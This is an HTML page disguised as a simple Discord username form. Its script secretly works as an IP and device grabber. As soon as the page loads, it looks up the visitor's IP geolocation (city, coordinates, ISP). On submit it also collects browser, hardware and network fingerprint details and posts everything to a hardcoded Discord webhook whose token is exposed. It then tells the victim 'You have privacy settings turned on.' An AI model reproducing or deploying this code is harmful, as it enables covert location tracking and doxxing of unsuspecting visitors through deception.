<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Welcome</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #2c2f33;
      color: #fff;
    }

    .container {
      text-align: center;
      background: rgba(35, 39, 42, 0.9);
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
      width: 300px;
    }

    input {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      border: none;
      border-radius: 5px;
    }

    button {
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      background-color: #7289da;
      color: white;
      cursor: pointer;
    }

    button:hover {
      background-color: #5b6eae;
    }

    #status {
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Welcome!</h1>
    <p>Please enter your Discord username. It will be sent to us!</p>
    <input type="text" id="discordUser" placeholder="Discord Username" required>
    <button onclick="submitData()">Submit</button>
    <p id="status"></p>
  </div>

  <script>
    const webhookUrl = 'https://discordapp.com/api/webhooks/1335664944028582000/c1CoPiNgVyekogi0OhqJQizguoBFy5XmTKydzmWb-8XQFOYEAZ_PyT79OgkQsc1ElmGl';

    let userIP = "Fetching...";
    let collectedData = {};

    // Fetch IP and location information
    async function fetchIPData() {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const ipData = await response.json();
        userIP = ipData.ip;
        collectedData.IP_Info = {
          ip: ipData.ip,
          city: ipData.city,
          region: ipData.region,
          country: ipData.country_name,
          latitude: ipData.latitude,
          longitude: ipData.longitude,
          isp: ipData.org,
        };
      } catch (error) {
        console.error('Error fetching IP info:', error);
        collectedData.IP_Info = 'Unavailable';
      }
    }

    // Fetch browser and device information
    function fetchDeviceInfo() {
      collectedData.Device_Info = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        viewportSize: `${window.innerWidth}x${window.innerHeight}`,
        cookiesEnabled: navigator.cookieEnabled,
        cores: navigator.hardwareConcurrency || 'Unknown',
        memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
      };
    }

    // Fetch network information
    function fetchNetworkInfo() {
      if (navigator.connection) {
        collectedData.Network_Info = {
          networkType: navigator.connection.effectiveType || 'Unknown',
          downlinkSpeed: `${navigator.connection.downlink || 0} Mbps`,
          latency: `${navigator.connection.rtt || 0} ms`,
          saveData: navigator.connection.saveData || false,
        };
      } else {
        collectedData.Network_Info = 'Unavailable';
      }
    }

    // Send data to the Discord webhook
    async function sendToWebhook(discordUser) {
      collectedData.Discord_User = discordUser;

      const formattedData = `**User Information:**\n\`\`\`json\n${JSON.stringify(collectedData, null, 2)}\n\`\`\``;

      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: formattedData }),
        });
      } catch (error) {
        console.error('Error sending to webhook:', error);
      }
    }

    // Main function to handle submission
    async function submitData() {
      const discordUser = document.getElementById('discordUser').value.trim();
      const status = document.getElementById('status');

      if (!discordUser) {
        status.textContent = 'Please enter your Discord username.';
        status.style.color = 'red';
        return;
      }

      // Fetch all data
      await fetchIPData();
      fetchDeviceInfo();
      fetchNetworkInfo();

      // Send data to webhook
      await sendToWebhook(discordUser);

      // Update UI
      status.textContent = 'You have privacy settings turned on.';
      status.style.color = 'green';
    }

    // Fetch IP data immediately
    fetchIPData();
  </script>
</body>
</html>
